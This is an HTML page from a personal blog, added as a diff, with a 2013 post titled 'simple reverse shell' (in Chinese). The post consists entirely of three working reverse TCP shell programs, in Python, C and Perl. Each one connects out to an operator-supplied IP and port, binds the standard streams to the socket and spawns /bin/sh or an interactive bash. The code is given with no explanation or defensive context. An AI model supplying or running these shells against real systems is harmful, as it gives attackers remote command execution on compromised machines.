@@ -1,0 +1,322 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+      <title>@xjump</title>
+
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS" href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">
+      
+
+      
+          <script src="/slideout/1.0.1/slideout.min.js"></script>
+          
+          <link rel="stylesheet" href="/katex/0.10.1/katex.min.css">
+
+          <script defer src="/katex/0.10.1/katex.min.js" ></script>
+          <script defer src="/katex/0.10.1/contrib/mathtex-script-type.min.js" ></script>
+              
+          <script defer src="/katex/0.10.1/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+              
+          
+      
+
+      
+          <link rel="stylesheet" href="https:&#x2F;&#x2F;xjump.me&#x2F;site.css">
+          
+          <link rel="stylesheet" href="/katex/0.10.1/katex.min.css"  >
+          
+      
+
+      
+      
+    </head>
+
+    <body>
+        <div class="container">
+
+            <div id="mobile-navbar" class="mobile-navbar">
+              <div class="mobile-header-logo">
+                <a href="/" class="logo">@xjump</a>
+              </div>
+              <div class="mobile-navbar-icon icon-out">
+                <span></span>
+                <span></span>
+                <span></span>
+              </div>
+            </div>
+
+            <nav id="mobile-menu" class="mobile-menu slideout-menu slideout-menu-left">
+              <ul class="mobile-menu-list">
+                
+                    <li class="mobile-menu-item">
+                        <a href="https://xjump.me">
+                            Home
+                        </a>
+                    </li>
+                
+                    <li class="mobile-menu-item">
+                        <a href="https://xjump.me&#x2F;categories">
+                            Categories
+                        </a>
+                    </li>
+                
+                    <li class="mobile-menu-item">
+                        <a href="https://xjump.me&#x2F;tags&#x2F;all">
+                            Archive
+                        </a>
+                    </li>
+                
+                    <li class="mobile-menu-item">
+                        <a href="https://xjump.me&#x2F;rss.xml">
+                            RSS
+                        </a>
+                    </li>
+                
+                    <li class="mobile-menu-item">
+                        <a href="https://xjump.me&#x2F;about">
+                            About
+                        </a>
+                    </li>
+                
+              </ul>
+            </nav>
+
+            <header id="header">
+                <div class="logo"><a href="https:&#x2F;&#x2F;xjump.me">@xjump</a></div>
+                <nav class="menu">
+                    <ul>
+                        
+                            <li>
+                                <a href="https://xjump.me">
+                                    Home
+                                </a>
+                            </li>
+                        
+                            <li>
+                                <a href="https://xjump.me&#x2F;categories">
+                                    Categories
+                                </a>
+                            </li>
+                        
+                            <li>
+                                <a href="https://xjump.me&#x2F;tags&#x2F;all">
+                                    Archive
+                                </a>
+                            </li>
+                        
+                            <li>
+                                <a href="https://xjump.me&#x2F;rss.xml">
+                                    RSS
+                                </a>
+                            </li>
+                        
+                            <li>
+                                <a href="https://xjump.me&#x2F;about">
+                                    About
+                                </a>
+                            </li>
+                        
+                    </ul>
+                </nav>
+            </header>
+
+            <main>
+                <div class="content" id="mobile-panel">
+                    
+
+
+
+<article class="post">
+    
+    <header class="post__header">
+        <h1 class="post__title">
+            <a href="https:&#x2F;&#x2F;xjump.me&#x2F;reverse-tcp-shell&#x2F;">简单的反弹shell</a>
+        </h1>
+        <div class="post__meta">
+            <span class="post__time">2013-01-07</span>
+            
+        </div>
+    </header>
+
+    <div class="post-content">
+      <p>
+    Python版：</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">#!/usr/bin/env python</span><span style="color:#65737e;">
+</span><span style="color:#65737e;">#-*- coding:utf-8 -*-</span><span style="color:#65737e;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">&#39;&#39;&#39;</span><span style="color:#65737e;">
+</span><span style="color:#65737e;"> </span><span style="color:#65737e;">author: xjump</span><span style="color:#65737e;">
+</span><span style="color:#65737e;"> </span><span style="color:#65737e;">file: reverse_tcp_shell.py</span><span style="color:#65737e;">
+</span><span style="color:#65737e;"> </span><span style="color:#65737e;">usage: python reverse_tcp_shell.py remote_ip remote_port</span><span style="color:#65737e;">
+</span><span style="color:#65737e;">&#39;&#39;&#39;</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">os,sys,socket</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">():</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(sys.argv) &lt; </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">Usage: python reverse_tcp_shell.py remote_ip port</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">sys.</span><span style="color:#bf616a;">exit</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">socket.</span><span style="color:#bf616a;">setdefaulttimeout</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">ip =  sys.argv[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">port = </span><span style="color:#bf616a;">int</span><span style="color:#c0c5ce;">(sys.argv[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">])</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">ADDR </span><span style="color:#c0c5ce;">= (ip,port)</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">s = socket.</span><span style="color:#bf616a;">socket</span><span style="color:#c0c5ce;">(socket.</span><span style="color:#bf616a;">AF_INET</span><span style="color:#c0c5ce;">,socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">try</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">s.</span><span style="color:#bf616a;">connect</span><span style="color:#c0c5ce;">((</span><span style="color:#bf616a;">ADDR</span><span style="color:#c0c5ce;">))</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">[+] Connect OK (</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">)</span><span style="color:#c0c5ce;">&#39; %(</span><span style="color:#bf616a;">ADDR</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">except</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">[+] Connect Error (</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">)</span><span style="color:#c0c5ce;">&#39; %(</span><span style="color:#bf616a;">ADDR</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">sys.</span><span style="color:#bf616a;">exit</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">s.</span><span style="color:#bf616a;">send</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">[+] secret knock!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">os.</span><span style="color:#bf616a;">dup2</span><span style="color:#c0c5ce;">(s.</span><span style="color:#bf616a;">fileno</span><span style="color:#c0c5ce;">(), sys.stderr.</span><span style="color:#bf616a;">fileno</span><span style="color:#c0c5ce;">())</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">os.</span><span style="color:#bf616a;">dup2</span><span style="color:#c0c5ce;">(s.</span><span style="color:#bf616a;">fileno</span><span style="color:#c0c5ce;">(), sys.stdin.</span><span style="color:#bf616a;">fileno</span><span style="color:#c0c5ce;">())</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">os.</span><span style="color:#bf616a;">dup2</span><span style="color:#c0c5ce;">(s.</span><span style="color:#bf616a;">fileno</span><span style="color:#c0c5ce;">(), sys.stdout.</span><span style="color:#bf616a;">fileno</span><span style="color:#c0c5ce;">())</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">os.</span><span style="color:#bf616a;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">s.</span><span style="color:#bf616a;">close</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span style="color:#c0c5ce;">&#39;:</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">main</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
+</span></pre><p>
+    C版：</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/socket.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">netinet/in.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">netdb.h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">usage</span><span style="color:#c0c5ce;">();</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> shell[]=&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> cmd[]=&quot;</span><span style="color:#a3be8c;">[+] secret knock!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> sclient;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">argv</span><span style="color:#c0c5ce;">[]) {</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(argc &lt;</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">){</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">usage</span><span style="color:#c0c5ce;">(argv[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr_in srv;</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">((sclient = </span><span style="color:#bf616a;">socket</span><span style="color:#c0c5ce;">(AF_INET, SOCK_STREAM, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] Couldn&#39;t make socket!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;); </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">srv.</span><span style="color:#bf616a;">sin_family </span><span style="color:#c0c5ce;">= AF_INET;</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">srv.</span><span style="color:#bf616a;">sin_port </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">htons</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">atoi</span><span style="color:#c0c5ce;">(argv[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">]));</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">srv.</span><span style="color:#bf616a;">sin_addr</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">s_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">inet_addr</span><span style="color:#c0c5ce;">(argv[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">connect</span><span style="color:#c0c5ce;">(sclient, (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr *)&amp;srv, sizeof(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sockaddr)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] Could not connect to controller!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;); </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">send</span><span style="color:#c0c5ce;">(sclient, cmd, sizeof(cmd), </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">dup2</span><span style="color:#c0c5ce;">(sclient, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">dup2</span><span style="color:#c0c5ce;">(sclient, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">dup2</span><span style="color:#c0c5ce;">(sclient, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">execl</span><span style="color:#c0c5ce;">(shell,&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;,(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*)</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">close</span><span style="color:#c0c5ce;">(sclient);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">usage</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">prog</span><span style="color:#c0c5ce;">[]) {</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\t\t</span><span style="color:#a3be8c;"> reverse_tcp_shell v0.1 </span><span style="color:#96b5b4;">\n\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Usage: </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> remote ip remote_port</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, prog);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
+</span></pre><p>
+    Perl版：</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">#!/usr/bin/perl -w</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">use strict</span><span style="color:#c0c5ce;">; </span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">use </span><span style="color:#ebcb8b;">Socket</span><span style="color:#c0c5ce;">; </span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">use </span><span style="color:#ebcb8b;">IO</span><span style="color:#c0c5ce;">::</span><span style="color:#ebcb8b;">Handle</span><span style="color:#c0c5ce;">; </span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">($#</span><span style="color:#bf616a;">ARGV</span><span style="color:#d08770;">+1 </span><span style="color:#c0c5ce;">!= </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">){ </span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">$#ARGV $0 Remote_IP Remote_Port </span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">exit </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">; </span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">} </span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">my </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">remote_ip </span><span style="color:#c0c5ce;">= $</span><span style="color:#bf616a;">ARGV</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]; </span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">my </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">remote_port </span><span style="color:#c0c5ce;">= $</span><span style="color:#bf616a;">ARGV</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]; </span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">my </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">proto </span><span style="color:#c0c5ce;">= </span><span style="color:#96b5b4;">getprotobyname</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">tcp</span><span style="color:#c0c5ce;">&quot;); </span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">my </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">pack_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">sockaddr_in</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">remote_port</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">inet_aton</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">remote_ip</span><span style="color:#c0c5ce;">)); </span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">my </span><span style="color:#c0c5ce;">$</span><span style="color:#bf616a;">shell </span><span style="color:#c0c5ce;">= &#39;</span><span style="color:#a3be8c;">/bin/bash -i</span><span style="color:#c0c5ce;">&#39;; </span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">socket</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">SOCK</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">AF_INET</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">SOCK_STREAM</span><span style="color:#c0c5ce;">, $</span><span style="color:#bf616a;">proto</span><span style="color:#c0c5ce;">); </span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#d08770;">STDOUT</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">autoflush</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">); </span><span style="color:#c0c5ce;">
+</span><span style="color:#d08770;">SOCK</span><span style="color:#c0c5ce;">-&gt;</span><span style="color:#bf616a;">autoflush</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">connect</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">SOCK</span><span style="color:#c0c5ce;">,$</span><span style="color:#bf616a;">pack_addr</span><span style="color:#c0c5ce;">) or </span><span style="color:#b48ead;">die </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">can not connect:$!</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">open </span><span style="color:#d08770;">STDIN</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">&lt;&amp;SOCK</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">open </span><span style="color:#d08770;">STDOUT</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">&gt;&amp;SOCK</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">open </span><span style="color:#d08770;">STDERR</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">&gt;&amp;SOCK</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Enjoy the shell.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">($</span><span style="color:#bf616a;">shell</span><span style="color:#c0c5ce;">); </span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">close </span><span style="color:#d08770;">SOCK</span><span style="color:#c0c5ce;">; </span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">exit </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span></pre>
+    </div>
+
+    
+    
+
+    <div class="post-footer">
+        
+            
+                <div class="post-tags">
+                    
+                        <!-- <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all&#x2F;">#all</a> -->
+                    
+                </div>
+            
+            
+                <div class="post-nav">
+                    
+                        <a class="previous" href="https:&#x2F;&#x2F;xjump.me&#x2F;tcp-32764-backdoor&#x2F;">‹ TCP-32764 backdoor</a>
+                    
+                    
+                        <a class="next" href="https:&#x2F;&#x2F;xjump.me&#x2F;android-ioctl-hook&#x2F;">Android system_server ioctl hook in root mode ›</a>
+                    
+                    
+                    
+                </div>
+            
+
+        
+
+    </div>
+
+    
+    
+</article>
+
+
+                </div>
+            </main>
+
+            
+            
+        </div>
+
+      
+          <script type="text/javascript" src="https:&#x2F;&#x2F;xjump.me&#x2F;even.js" ></script>
+      
+    </body>
+
+</html>
